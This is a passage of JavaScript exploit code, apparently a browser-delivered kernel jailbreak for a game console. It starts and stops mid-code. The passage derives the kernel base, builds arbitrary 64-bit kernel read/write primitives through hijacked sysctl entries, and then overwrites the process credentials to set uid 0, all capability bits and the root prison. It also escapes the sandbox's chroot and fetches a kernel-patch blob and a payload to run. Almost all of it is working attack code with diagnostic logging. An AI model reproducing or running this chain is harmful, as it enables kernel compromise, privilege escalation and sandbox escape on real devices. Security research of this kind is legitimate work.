        "anchor-every-byte-unique",
        bad === 0,
        "nomatch=" + bad + " jobs=" + NJ,
      )
    )
      return;

    check(
      "anchor-duplicates-agree",
      B.b6 === B.b6d && B.b7 === B.b7d,
      "b6=0x" +
        B.b6.toString(16) +
        " b6d=0x" +
        B.b6d.toString(16) +
        " b7=0x" +
        B.b7.toString(16) +
        " b7d=0x" +
        B.b7d.toString(16),
    );

    const handlerLo =
      (((B.b7 << 24) >>> 0) + ((B.b6 << 16) >>> 0) + (B.b1 << 8) + B.b0) >>> 0;
    const kbLo = (handlerLo - RVA_RSVD) >>> 0;
    const KBASE = new int64(kbLo, 0xffffffff);
    mark(
      "ANCHOR-HANDLER",
      "handler=0xffffffff" +
        handlerLo.toString(16).padStart(8, "0") +
        " rva=0x" +
        RVA_RSVD.toString(16) +
        " b7=0x" +
        B.b7.toString(16) +
        " b6=0x" +
        B.b6.toString(16) +
        " b1=0x" +
        B.b1.toString(16) +
        " b0=0x" +
        B.b0.toString(16),
    );

    const kbAligned = (kbLo & 0x3fff) === 0;
    check(
      "ANCHOR-KERNEL-BASE",
      kbAligned,
      "kernel_base=" +
        KBASE +
        " aligned0x4000=" +
        (kbAligned ? 1 : 0) +
        " low=0x" +
        kbLo.toString(16),
    );
    mark(
      "ANCHOR-VERDICT",
      "fw=" +
        fwKey +
        " kernel_base=" +
        KBASE +
        " armings=" +
        armCount +
        " curthread=" +
        CT1 +
        " verdict=" +
        (kbAligned ? "ANCHORED" : "REJECTED") +
        (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned"),
    );

    if (!kbAligned) {
      allDone = true;
      return;
    }

    const OID = KBASE.add32(off.k_oid_kern_file);
    const O_NUM = OID.add32(0x10);
    const O_VIS = OID.add32(0x50);
    const O_RAN = OID.add32(0x54);
    const KERN_FILE_NUM = 15;
    const ONUM_N = params.get("onum") ? parseInt(params.get("onum"), 10) : 64;
    mark(
      "KF-TARGETS",
      "oid=" + OID + " oid_number=" + O_NUM + " vis=" + O_VIS + " ran=" + O_RAN,
    );

    function oracleAt(addr, n, label) {
      const sAb = new ArrayBuffer(4);
      keepAlive.push(sAb);
      const sDv = new DataView(sAb),
        sAd = bufAddr(sAb);
      sDv.setInt32(0, 0x40000000, true);
      let i = 0;
      for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
      if (runChain(i, label) === null) return null;
      if (!fireOk(label)) return null;
      const m = 0x40000000 - sDv.getInt32(0, true);
      return { m: m, v: m > 0 ? n - m + 1 : 0 };
    }

    function sweepAt(stepAd, probeAd, low, label) {
      const sAb = new ArrayBuffer(4 * SWEEP);
      keepAlive.push(sAb);
      const sDv = new DataView(sAb),
        sAd = bufAddr(sAb);
      for (let k = 0; k < SWEEP; k++) sDv.setInt32(k * 4, 0x40000000, true);
      let i = 0;
      for (let k = 0; k < SWEEP; k++) {
        wnode(i++, stepAd, DUM, false);
        wnode(i++, probeAd, sAd.add32(k * 4), false);
      }
      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
      if (runChain(i, label) === null) return null;
      if (!fireOk(label)) return null;
      let obs = "";
      for (let k = 0; k < SWEEP; k++)
        obs += 0x40000000 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
      return decodeByte(obs, low);
    }

    function planSub(cur, delta) {
      const d = [
        delta & 0xff,
        (delta >>> 8) & 0xff,
        (delta >>> 16) & 0xff,
        (delta >>> 24) & 0xff,
      ];
      let clean = true;
      for (let j = 1; j < 4; j++)
        if (d[j] > ((cur >>> (8 * j)) & 0xff)) clean = false;
      return { d: d, n: d[0] + d[1] + d[2] + d[3], clean: clean };
    }
    function emitSub(base, i, plan) {
      const pos = [];
      for (let j = 0; j < 4; j++)
        for (let q = 0; q < plan.d[j]; q++) pos.push(j);
      for (let j = 0; j < pos.length; j++)
        wnode(i++, base.add32(pos[j]), DUM, false);
      return i;
    }

    const CAPS_B = UCRED.add32(0x67);
    const CAPS_PR = UCRED.add32(0x64);
    const CAPS_TARGET = 0x60;
    const CAPS_RESTORE = params.get("caprestore") === "1";
    mark(
      "CAPS-TARGET",
      "ucred=" +
        UCRED +
        " caps0=" +
        UCRED.add32(0x60) +
        " byte=" +
        CAPS_B +
        " probe=" +
        CAPS_PR +
        " want_bit=62" +
        " target=0x" +
        CAPS_TARGET.toString(16),
    );

    const mf1 = multiFire(
      [
        { kind: "sweep", step: CAPS_B, probe: CAPS_PR, low: 0x000000 },
        { kind: "oracle", addr: O_NUM, n: ONUM_N },
      ],
      "caps-byte+oid_number",
    );
    if (mf1 === null) return;
    const cb = mf1[0],
      on = mf1[1];

    const bLo = (cb.b - 1) & 0xff,
      bHi = cb.b;
    const setLo = (bLo & 0x40) !== 0,
      setHi = (bHi & 0x40) !== 0;
    mark(
      "CAPS-BYTE",
      "b=" +
        (cb.b < 0 ? "NO-MATCH" : "0x" + cb.b.toString(16)) +
        " cands=" +
        cb.n +
        " true_in={0x" +
        bLo.toString(16) +
        ",0x" +
        bHi.toString(16) +
        "} bit62_lo=" +
        (setLo ? 1 : 0) +
        " bit62_hi=" +
        (setHi ? 1 : 0),
    );
    if (
      !check(
        "caps-byte-decoded",
        cb.b >= 0 && cb.n === 1,
        "b=" + cb.b + " cands=" + cb.n,
      )
    )
      return;

    let capsWrote = 0,
      capsSkip = "",
      capsPend = 0;
    if (setLo && setHi) {
      capsSkip = "already-set";
      mark("CAPS-SKIP", "bit62 set for both candidates -- no write");
    } else if (params.get("nocaps") === "1") {
      capsSkip = "opted-out";
      mark("CAPS-SKIP", "?nocaps=1 -- read-only, gate 2 stays closed");
    } else {
      const dN = (bHi + 1) & 0xff;
      const fin = [
        (bHi - dN) & 0xff,
        (bLo - dN) & 0xff,
        (bHi - dN - 1) & 0xff,
        (bLo - dN - 1) & 0xff,
      ];
      const allSet = fin.every(function (v) {
        return (v & 0x40) !== 0;
      });
      mark(
        "CAPS-PLAN",
        "decrement " +
          CAPS_B +
          " by " +
          dN +
          " -> final in {" +
          fin
            .map(function (v) {
              return "0x" + v.toString(16);
            })
            .join(",") +
          "} all_bit62=" +
          (allSet ? 1 : 0) +
          " wraps=1",
      );
      if (
        !check(
          "caps-plan-ok",
          dN > 0 && dN <= 0x100 && allSet,
          "n=" + dN + " finals=" + fin.join(","),
        )
      )
        return;
      capsPend = dN;
    }

    function multiFire(jobs, label) {
      let need = 0;
      for (const j of jobs) need += j.kind === "sweep" ? SWEEP * 2 : j.n;
      mark(
        "MF-PLAN",
        label +
          " jobs=" +
          jobs.length +
          " nodes=" +
          need +
          " kinds=" +
          jobs
            .map(function (j) {
              return j.kind;
            })
            .join(","),
      );
      if (
        !check(
          "mf-bounded-" + label,
          need > 0 && need <= MAXN,
          "need=" + need + " arena=" + MAXN,
        )
      )
        return null;
      const nSink = jobs.reduce(function (a, j) {
        return a + (j.kind === "sweep" ? SWEEP : j.kind === "oracle" ? 1 : 0);
      }, 0);
      const sAb = new ArrayBuffer(4 * Math.max(1, nSink));
      keepAlive.push(sAb);
      const sDv = new DataView(sAb),
        sAd = bufAddr(sAb);
      for (let k = 0; k < nSink; k++) sDv.setInt32(k * 4, 0x40000000, true);
      let i = 0,
        sk = 0;
      const base = [];
      for (const j of jobs) {
        base.push(sk);
        if (j.kind === "sweep") {
          for (let k = 0; k < SWEEP; k++) {
            wnode(i++, j.step, DUM, false);
            wnode(i++, j.probe, sAd.add32((sk + k) * 4), false);
          }
          sk += SWEEP;
        } else if (j.kind === "oracle") {
          for (let k = 0; k < j.n; k++)
            wnode(i++, j.addr, sAd.add32(sk * 4), false);
          sk += 1;
        } else {
          for (let k = 0; k < j.n; k++) wnode(i++, j.addr, DUM, false);
        }
      }
      if (i === 0)
        return jobs.map(function () {
          return null;
        });
      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
      if (runChain(i, label) === null) return null;
      if (!fireOk(label)) return null;
      const out = [];
      for (let q = 0; q < jobs.length; q++) {
        const j = jobs[q];
        if (j.kind === "sweep") {
          let obs = "";
          for (let k = 0; k < SWEEP; k++)
            obs +=
              0x40000000 - sDv.getInt32((base[q] + k) * 4, true) > 0
                ? "1"
                : "0";
          out.push(decodeByte(obs, j.low));
        } else if (j.kind === "oracle") {
          const m = 0x40000000 - sDv.getInt32(base[q] * 4, true);
          out.push({ m: m, v: m > 0 ? j.n - m + 1 : 0 });
        } else out.push({ n: j.n });
      }
      return out;
    }

    const IPV6_TCLASS = 61,
      KF_MARK = 0x41;
    const kfSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
    if (kfSock >= 0) {
      opened.push(kfSock);
      const tAb = new ArrayBuffer(4);
      keepAlive.push(tAb);
      const tDv = new DataView(tAb);
      tDv.setInt32(0, KF_MARK, true);
      sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4);
    }
    if (
      !check(
        "kf-target-socket",
        kfSock >= 0,
        "fd=" + kfSock + " tclass=0x" + KF_MARK.toString(16),
      )
    )
      return;

    const mibAb = new ArrayBuffer(8);
    keepAlive.push(mibAb);
    const mibDv = new DataView(mibAb),
      mibAd = bufAddr(mibAb);
    mibDv.setInt32(0, 1, true);
    mibDv.setInt32(4, KERN_FILE_NUM, true);
    const KF_BYTES = 1 << 20;
    const kfAb = new ArrayBuffer(KF_BYTES);
    keepAlive.push(kfAb);
    const kfDv = new DataView(kfAb),
      kfAd = bufAddr(kfAb);
    const olAb = new ArrayBuffer(8);
    keepAlive.push(olAb);
    const olDv = new DataView(olAb),
      olAd = bufAddr(olAb);
    function kernFile(withBuf, tag) {
      olDv.setInt32(0, withBuf ? KF_BYTES : 0, true);
      olDv.setInt32(4, 0, true);
      const r = sc(SYS.sysctl, mibAd, 2, withBuf ? kfAd : 0, olAd, 0, 0);
      const rv = r.i32,
        er = rv < 0 ? errno() : 0;
      const ln = olDv.getUint32(0, true);
      mark("KF-SYSCTL", tag + " rv=" + rv + " errno=" + er + " oldlen=" + ln);
      return { rv: rv, err: er, len: ln };
    }

    const base0 = kernFile(false, "baseline");
    check(
      "kf-baseline-is-enoent",
      base0.rv < 0 && base0.err === 2,
      "rv=" + base0.rv + " errno=" + base0.err + " want=-1/2",
    );

    mark(
      "KF-OIDNUM",
      "addr=" +
        O_NUM +
        " n=" +
        ONUM_N +
        " m=" +
        on.m +
        " v=" +
        on.v +
        " want=" +
        KERN_FILE_NUM,
    );
    if (
      !check(
        "KF-ANCHOR-CONFIRMED",
        on.v === KERN_FILE_NUM,
        "oid_number=" +
          on.v +
          " want=" +
          KERN_FILE_NUM +
          " kernel_base=" +
          KBASE,
      )
    )
      return;

    const curNum = (KERN_FILE_NUM - ONUM_N) >>> 0;
    const pNum = planSub(curNum, (curNum - KERN_FILE_NUM) >>> 0);
    mark(
      "KF-RESTORE-PLAN",
      "cur=0x" +
        curNum.toString(16) +
        " digits=" +
        pNum.d.join(",") +
        " nodes=" +
        pNum.n +
        " clean=" +
        (pNum.clean ? 1 : 0),
    );
    if (
      !check(
        "kf-restore-clean",
        pNum.clean && pNum.n <= 1020,
        "nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0),
      )
    )
      return;

    {
      let i = emitSub(O_NUM, 0, pNum);
      wnode(i++, O_VIS, DUM, false);
      for (let q = 0; q < capsPend; q++) wnode(i++, CAPS_B, DUM, false);
      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
      mark(
        "KF-WRITE",
        "restore_oid_number=" +
          pNum.n +
          " unhide=1 caps=" +
          capsPend +
          " total=" +
          i,
      );
      if (runChain(i, "restore+unhide+caps") === null) return;
      if (!fireOk("restore+unhide+caps")) {
        if (lastFire.n0 === 1) {
          capsWrote = capsPend;
          mark(
            "CAPS-WROTE-UNVERIFIED",
            "caps=" + capsPend + " f_socket=" + lastFire.fsock,
          );
        }
        return;
      }
      capsWrote = capsPend;
    }
    mark(
      "CAPS-DONE",
      "wrote=" +
        capsWrote +
        " skip=" +
        (capsSkip || "none") +
        " armings=" +
        armCount,
    );

    const after = kernFile(false, "after-unhide");
    const got = after.rv === 0 ? kernFile(true, "with-buffer") : null;

    const capsLive = after.rv === 0;
    const A_OID = KBASE.add32(off.k_oid_maxfilesperproc);
    const A2_OID = KBASE.add32(off.k_oid_maxprocperuid);
    const B_OID = KBASE.add32(off.k_oid_maxfiles);
    const A_ARG1_CUR = KBASE.add32(off.k_arg1_maxfilesperproc);
    const A2_ARG1_CUR = KBASE.add32(off.k_arg1_maxprocperuid);
    const B_ARG1 = B_OID.add32(0x18);
    mark(
      "KRW-OIDS",
      "A(1,27)=" +
        A_OID +
        " A2(1,28)=" +
        A2_OID +
        " B(1,7)=" +
        B_OID +
        " &B.arg1=" +
        B_ARG1 +
        " capsLive=" +
        (capsLive ? 1 : 0),
    );

    function planLow(cur, tgt) {
      if (cur.hi >>> 0 !== tgt.hi >>> 0) return null;
      const b = [];
      for (let k = 0; k < 4; k++) b.push((cur.low >>> (8 * k)) & 0xff);
      b.push(0, 0, 0, 0);
      const t = [];
      for (let k = 0; k < 4; k++) t.push((tgt.low >>> (8 * k)) & 0xff);
      function decwin(j) {
        let c = -1;
        for (let k = 0; k < 4 && j + k < 8; k++) {
          let v = b[j + k] + c;
          if (v < 0) {
            v += 256;
            c = -1;
          } else c = 0;
          b[j + k] = v;
          if (c === 0) break;
        }
      }
      const pos = [];
      for (let j = 0; j < 4; j++) {
        const d = (b[j] - t[j]) & 0xff;
        for (let q = 0; q < d; q++) {
          pos.push(j);
          decwin(j);
        }
      }
      const lowOk =
        b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3];
      const hiClean = b[4] === 0 && b[5] === 0 && b[6] === 0 && b[7] === 0;
      if (!lowOk || !hiClean || pos.length < 1 || pos.length > 4090)
        return null;
      return pos;
    }

    const posA = planLow(A_ARG1_CUR, B_ARG1);
    const posA2 = planLow(A2_ARG1_CUR, B_ARG1.add32(4));
    mark(
      "KRW-PLAN",
      "posA=" +
        (posA ? posA.length : "REFUSED") +
        " posA2=" +
        (posA2 ? posA2.length : "REFUSED"),
    );
    const planOk = capsLive && !!posA && !!posA2;
    if (
      !check(
        "krw-plan-ok",
        planOk,
        planOk
          ? ""
          : "capsLive=" +
              (capsLive ? 1 : 0) +
              " posA=" +
              (posA ? posA.length : "null") +
              " posA2=" +
              (posA2 ? posA2.length : "null"),
      )
    ) {
      allDone = true;
    } else {
      {
        let i = 0;
        wnode(i++, A_OID.add32(0x50), DUM, false);
        wnode(i++, A2_OID.add32(0x50), DUM, false);
        wnode(i++, B_OID.add32(0x50), DUM, false);
        for (let k = 0; k < posA.length; k++)
          wnode(i++, A_OID.add32(0x18 + posA[k]), DUM, false);
        for (let k = 0; k < posA2.length; k++)
          wnode(i++, A2_OID.add32(0x18 + posA2[k]), DUM, false);
        put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
        mark(
          "KRW-FIRE",
          "nodes=" +
            i +
            " (3 unhide + " +
            posA.length +
            " A + " +
            posA2.length +
            " A2)",
        );
        if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
          allDone = true;
        } else if (runChain(i, "krw-setup") === null) {
          allDone = true;
        } else if (!fireOk("krw-setup")) {
          allDone = true;
        } else {
          const kmAb = new ArrayBuffer(8);
          keepAlive.push(kmAb);
          const kmDv = new DataView(kmAb),
            kmAd = bufAddr(kmAb);
          const koAb = new ArrayBuffer(4);
          keepAlive.push(koAb);
          const koDv = new DataView(koAb),
            koAd = bufAddr(koAb);
          const knAb = new ArrayBuffer(4);
          keepAlive.push(knAb);
          const knDv = new DataView(knAb),
            knAd = bufAddr(knAb);
          const klAb = new ArrayBuffer(8);
          keepAlive.push(klAb);
          const klDv = new DataView(klAb),
            klAd = bufAddr(klAb);
          function kMib(a, b) {
            kmDv.setInt32(0, a, true);
            kmDv.setInt32(4, b, true);
          }
          function kSysRead(a, b) {
            kMib(a, b);
            klDv.setInt32(0, 4, true);
            klDv.setInt32(4, 0, true);
            koDv.setInt32(0, 0, true);
            const r = sc(SYS.sysctl, kmAd, 2, koAd, klAd, 0, 0).i32;
            const er = r < 0 ? errno() : 0;
            const vl = koDv.getInt32(0, true);
            return { rv: r, err: er, val: vl };
          }
          function kSysWrite(a, b, v) {
            kMib(a, b);
            knDv.setInt32(0, v | 0, true);
            const r = sc(SYS.sysctl, kmAd, 2, 0, 0, knAd, 4).i32;
            const er = r < 0 ? errno() : 0;
            return { rv: r, err: er };
          }

          function steer(X) {
            kSysWrite(1, 27, X.low | 0);
            kSysWrite(1, 28, X.hi | 0);
          }
          function kread32(X) {
            steer(X);
            return kSysRead(1, 7).val >>> 0;
          }
          function kwrite32(X, v) {
            steer(X);
            return kSysWrite(1, 7, v | 0).rv;
          }
          function read8(X) {
            const lo = kread32(X),
              hi = kread32(X.add32(4));
            return new int64(lo >>> 0, hi >>> 0);
          }
          function write8(X, V) {
            kwrite32(X, V.low | 0);
            kwrite32(X.add32(4), V.hi | 0);
          }

          const t1 = kread32(A_OID.add32(0x10));
          mark("KRW-T1-READ32-IMG", "*(A_oid+0x10)=" + t1 + " want=27");
          check("krw-read32-image", t1 === 27, "got=" + t1);

          const t2 = read8(A_OID.add32(0x10));
          const t2ok = t2.low >>> 0 === 27 && t2.hi >>> 0 === 0xc0040002;
          mark(
            "KRW-T2-READ8-IMG",
            "*(A_oid+0x10)=" + t2 + " want=lo:27 hi:0xc0040002",
          );
          check("krw-read8-image", t2ok, "got=" + t2);

          const uidNow = sc(SYS.getuid).i32 >>> 0;
          const t3 = kread32(UCRED.add32(0x04));
          mark(
            "KRW-T3-READ32-HEAP",
            "*(ucred+0x04)=cr_uid=" + t3 + " getuid=" + uidNow,
          );
          check(
            "krw-read32-heap",
            t3 === uidNow,
            "cr_uid=" + t3 + " getuid=" + uidNow,
          );
          mark("KRW-T3B-READ8-HEAP", "read8(ucred)=" + read8(UCRED));

          const SCR4 = KBASE.add32(off.k_arg1_maxfiles);
          const o4 = kread32(SCR4);
          kwrite32(SCR4, 0x41424344);
          const r4 = kread32(SCR4);
          kwrite32(SCR4, o4 | 0);
          const b4 = kread32(SCR4);
          mark(
            "KRW-T4-WRITE32",
            "orig=" +
              o4 +
              " wrote=0x41424344 readback=0x" +
              r4.toString(16) +
              " restored=" +
              b4,
          );
          check(
            "krw-write32",
            r4 === 0x41424344 && b4 === o4,
            "readback=0x" + r4.toString(16) + " restored=" + b4,
          );

          const SCR8 = KBASE.add32(off.k_oid_maxfiles + 0x20);
          const o8 = read8(SCR8);
          const MAGIC8 = new int64(0xdeadbeef, 0x11223344);
          write8(SCR8, MAGIC8);
          const r8 = read8(SCR8);
          write8(SCR8, o8);
          const b8 = read8(SCR8);
          const t5ok =
            r8.low >>> 0 === 0xdeadbeef &&
            r8.hi >>> 0 === 0x11223344 &&
            b8.low >>> 0 === o8.low >>> 0 &&
            b8.hi >>> 0 === o8.hi >>> 0;
          mark(
            "KRW-T5-WRITE64",
            "orig=" +
              o8 +
              " wrote=" +
              MAGIC8 +
              " readback=" +
              r8 +
              " restored=" +
              b8,
          );
          check("krw-write64", t5ok, "readback=" + r8 + " restored=" + b8);

          mark(
            "KRW-VERDICT",
            "fw=" +
              fwKey +
              " kernel_base=" +
              KBASE +
              " read32=" +
              (t1 === 27 ? 1 : 0) +
              " read8=" +
              (t2ok ? 1 : 0) +
              " heap=" +
              (t3 === uidNow ? 1 : 0) +
              " write32=" +
              (r4 === 0x41424344 ? 1 : 0) +
              " write64=" +
              (t5ok ? 1 : 0) +
              " armings=" +
              armCount +
              "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **",
          );
          mark(
            "KRW-API",
            "read8/write8/kread32/kwrite32 ready -- drop into the" +
              " lapse/poops jailbreak stages (sysent hijack -> kpatch -> payload)",
          );

          const krwOk =
            t1 === 27 && t2ok && t3 === uidNow && r4 === 0x41424344 && t5ok;
          mark(
            "EG-GATE",
            "krwOk=" +
              (krwOk ? 1 : 0) +
              " jb=" +
              (DO_JB ? 1 : 0) +
              " patch=" +
              (DO_PATCH ? 1 : 0) +
              " payload=" +
              (DO_PAYLOAD ? 1 : 0),
          );
          if (
            !check(
              "eg-krw-ok",
              krwOk,
              "krwOk=" +
                (krwOk ? 1 : 0) +
                " (endgame needs all 5 KRW self-tests to pass)",
            )
          ) {
            allDone = true;
          } else {
            const sameI64 = (a, b) =>
              a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
            const kptr = (v) => !!v && v.hi >>> 0 >= 0xffff0000;
            const NEG1 = new int64(0xffffffff, 0xffffffff);
            function kview(base) {
              return {
                getBInt: (o) => read8(base.add32(o)),
                setBInt: (o, v) => write8(base.add32(o), v),
                getInt32: (o) => kread32(base.add32(o)) | 0,
                setInt32: (o, v) => {
                  kwrite32(base.add32(o), v | 0);
                },
              };
            }
            function findStub(num) {
              for (let o = 0; o < off.k_scan_stage1; o += 16) {
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
                  continue;
                if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 === num)
                  return libkernelBase.add32(o);
              }
              return null;
            }
            const stSetuid = findStub(23),
              stGeteuid = findStub(25),
              stOpen = findStub(5);
            let jbDone = false,
              kpDone = false,
              plDone = false,
              jbUcred = null;
            let jbSaved = null,
              jbRestored = false;

            let kpatchBlob = null,
              payloadBlob = null;
            const SITES = [];
            if (DO_PATCH) {
              try {
                const r = await fetch(KPATCH_FILE);
                if (r.ok) kpatchBlob = new Uint8Array(await r.arrayBuffer());
              } catch (e) {
                mark("KPATCH-FETCH-THREW", (e && e.message) || String(e));
              }
              if (kpatchBlob)
                for (let i = 0; i + 7 <= kpatchBlob.length; i++) {
                  if (kpatchBlob[i] !== 0xc6 || kpatchBlob[i + 1] !== 0x81)
                    continue;
                  if (kpatchBlob[i + 6] !== 0xeb) continue;
                  SITES.push(
                    (kpatchBlob[i + 2] |
                      (kpatchBlob[i + 3] << 8) |
                      (kpatchBlob[i + 4] << 16) |
                      (kpatchBlob[i + 5] << 24)) >>>
                      0,
                  );
                }
              mark(
                "KPATCH-BLOB",
                "file=" +
                  KPATCH_FILE +
                  " bytes=" +
                  (kpatchBlob ? kpatchBlob.length : 0) +
                  " sites=" +
                  SITES.length,
              );
            }
            if (DO_PAYLOAD) {
              try {
                const r = await fetch(PAYLOAD_FILE);
                if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
              } catch (e) {
                mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
              }
              mark(
                "PAYLOAD-BLOB",
                "file=" +
                  PAYLOAD_FILE +
                  " bytes=" +
                  (payloadBlob ? payloadBlob.length : 0) +
                  " head=" +
                  (payloadBlob
                    ? payloadBlob[0] === 0xe9
                      ? "e9-ok"
                      : "NOT-e9"
                    : "none"),
              );
            }

            if (DO_JB) {
              const P_UCRED = 0x40,
                P_FD = 0x48,
                TD_PROC = 0x8;
              const CR_UID = 0x04,
                CR_RUID = 0x08,
                CR_SVUID = 0x0c,
                CR_NGROUPS = 0x10;
              const CR_RGID = 0x14,
                CR_PRISON = 0x30,
                CR_SCECAPS1 = 0x60,
                CR_SCECAPS0 = 0x68;
              const FD_RDIR = 0x10,
                FD_JDIR = 0x18;
              const curproc = read8(CT1.add32(TD_PROC));
              jbUcred = kptr(curproc) ? read8(curproc.add32(P_UCRED)) : null;
              const pFd = kptr(curproc) ? read8(curproc.add32(P_FD)) : null;

              const prison0 = KBASE.add32(off.k_prison0);
              const rootvn = read8(KBASE.add32(off.k_rootvnode));
              mark(
                "JB-SOURCES",
                "curproc=" +
                  curproc +
                  " ucred=" +
                  jbUcred +
                  " krwUcred=" +
                  UCRED +
                  " p_fd=" +
                  pFd +
                  " prison0=" +
                  prison0 +
                  " rootvnode=" +
                  rootvn,
              );
              const srcOk =
                kptr(curproc) &&
                kptr(jbUcred) &&
                kptr(pFd) &&
                kptr(rootvn) &&
                sameI64(jbUcred, UCRED);
              if (
                check(
                  "jb-sources-are-kernel-pointers",
                  srcOk,
                  "curproc=" +
                    curproc +
                    " ucred=" +
                    jbUcred +
                    " pfd=" +
                    pFd +
                    " rootvn=" +
                    rootvn,
                )
              ) {
                const uidBefore = sc(SYS.getuid).i32;
                const probePaths = ["/", "/system", "/mini-syscore.elf"];
                const before = [];
                if (stOpen)
                  for (const pth of probePaths) {
                    const pab = new ArrayBuffer(pth.length + 1);
                    keepAlive.push(pab);
                    const pu8 = new Uint8Array(pab);
                    for (let i = 0; i < pth.length; i++)
                      pu8[i] = pth.charCodeAt(i);
                    const fd = callAddr(stOpen, [bufAddr(pab), 0, 0]).i32;
                    before.push(pth + "=" + fd);
                    if (fd >= 0) sc(SYS.close, fd);
                  }
                mark(
                  "JB-PRECHECK",
                  "getuid=" + uidBefore + " sandbox=[" + before.join(" ") + "]",
                );

                const U = kview(jbUcred),
                  F = kview(pFd);

                jbSaved = {
                  U: U,
                  F: F,
                  ucred: jbUcred,
                  fd: pFd,
                  prison: U.getBInt(CR_PRISON),
                  rdir: F.getBInt(FD_RDIR),
                  jdir: F.getBInt(FD_JDIR),
                  caps1: U.getBInt(CR_SCECAPS1),
                  caps0: U.getBInt(CR_SCECAPS0),
                  uid: U.getInt32(CR_UID),
                  ruid: U.getInt32(CR_RUID),
                  svuid: U.getInt32(CR_SVUID),
                  ngroups: U.getInt32(CR_NGROUPS),
                  rgid: U.getInt32(CR_RGID),
                  off: {
                    CR_UID,
                    CR_RUID,
                    CR_SVUID,
                    CR_NGROUPS,
                    CR_RGID,
                    CR_PRISON,
                    CR_SCECAPS1,
                    CR_SCECAPS0,
                    FD_RDIR,
                    FD_JDIR,
                  },
                };
                mark(
                  "JB-SAVED",
                  "prison=" +
                    jbSaved.prison +
                    " rdir=" +
                    jbSaved.rdir +
                    " jdir=" +
                    jbSaved.jdir +
                    " uid=" +
                    jbSaved.uid +
                    " caps=" +
                    jbSaved.caps1 +
                    "/" +
                    jbSaved.caps0 +
                    "  (refcounted handles -- restoring these is what keeps" +
                    " fdescfree/crfree balanced at process exit)",
                );

                jbRestoreHook = function (why) {
                  if (jbRestored) return true;

                  F.setBInt(FD_RDIR, jbSaved.rdir);
                  F.setBInt(FD_JDIR, jbSaved.jdir);
                  U.setBInt(CR_PRISON, jbSaved.prison);
                  U.setBInt(CR_SCECAPS1, jbSaved.caps1);
                  U.setBInt(CR_SCECAPS0, jbSaved.caps0);
                  U.setInt32(CR_UID, jbSaved.uid);
                  U.setInt32(CR_RUID, jbSaved.ruid);
                  U.setInt32(CR_SVUID, jbSaved.svuid);
                  U.setInt32(CR_NGROUPS, jbSaved.ngroups);
                  U.setInt32(CR_RGID, jbSaved.rgid);
                  const okRdir = sameI64(F.getBInt(FD_RDIR), jbSaved.rdir);
                  const okJdir = sameI64(F.getBInt(FD_JDIR), jbSaved.jdir);
                  const okPr = sameI64(U.getBInt(CR_PRISON), jbSaved.prison);
                  const okAll = okRdir && okJdir && okPr;
                  mark(
                    "JB-RESTORE",
                    why +
                      " rdir=" +
                      (okRdir ? 1 : 0) +
                      " jdir=" +
                      (okJdir ? 1 : 0) +
                      " prison=" +
                      (okPr ? 1 : 0) +
                      " uid=" +
                      sc(SYS.getuid).i32 +
                      " -> " +
                      (okAll
                        ? "fdescfree/crfree are balanced again"
                        : "NOT RESTORED -- reboot before closing the browser"),
                  );
                  check(
                    "JB-RESTORED-CLEAN",
                    okAll,
                    "rdir/jdir/prison readback",
                  );
                  jbRestored = okAll;
                  return okAll;
                };
                U.setInt32(CR_UID, 0x1337);
                const probeUid = sc(SYS.getuid).i32 >>> 0;
                mark(
                  "JB-UCRED-PROBE",
                  "wrote cr_uid=0x1337 getuid=0x" +
                    probeUid.toString(16) +
                    " match=" +
                    (probeUid === 0x1337 ? 1 : 0),
                );

                U.setInt32(CR_UID, 0);
                U.setInt32(CR_RUID, 0);
                U.setInt32(CR_SVUID, 0);
                U.setInt32(CR_NGROUPS, 1);
                U.setInt32(CR_RGID, 0);
                U.setBInt(CR_PRISON, prison0);
                U.setBInt(CR_SCECAPS1, NEG1);
                U.setBInt(CR_SCECAPS0, NEG1);
                F.setBInt(FD_RDIR, rootvn);
                F.setBInt(FD_JDIR, rootvn);
                mark(
                  "JB-CAPS-READBACK",
                  "caps0=" +
                    read8(jbUcred.add32(0x60)) +
                    " caps1=" +
                    read8(jbUcred.add32(0x68)) +
                    " want=-1/-1",
                );

                const uidNow2 = sc(SYS.getuid).i32;
                const euNow = stGeteuid ? callAddr(stGeteuid, []).i32 : uidNow2;
                const suNow = stSetuid ? callAddr(stSetuid, [0]).i32 : 0;
                const rbUid = U.getInt32(CR_UID);
                const rbPrison = U.getBInt(CR_PRISON);
                const rbRdir = F.getBInt(FD_RDIR);
                const after = [];
                let escaped = false;
                if (stOpen)
                  for (let i = 0; i < probePaths.length; i++) {
                    const pth = probePaths[i];
                    const pab = new ArrayBuffer(pth.length + 1);
                    keepAlive.push(pab);
                    const pu8 = new Uint8Array(pab);
                    for (let j = 0; j < pth.length; j++)
                      pu8[j] = pth.charCodeAt(j);
                    const fd = callAddr(stOpen, [bufAddr(pab), 0, 0]).i32;
                    after.push(pth + "=" + fd);
                    if (fd >= 0) {
                      sc(SYS.close, fd);
                      if (before[i] && before[i].indexOf("=-") > 0)
                        escaped = true;
                    }
                  }
                jbDone =
                  uidNow2 === 0 &&
                  rbUid === 0 &&
                  sameI64(rbPrison, prison0) &&
                  sameI64(rbRdir, rootvn);
                jailbroken = jbDone;
                mark(
                  "JB-ROOT",
                  "getuid=" +
                    uidNow2 +
                    " geteuid=" +
                    euNow +
                    " setuid0=" +
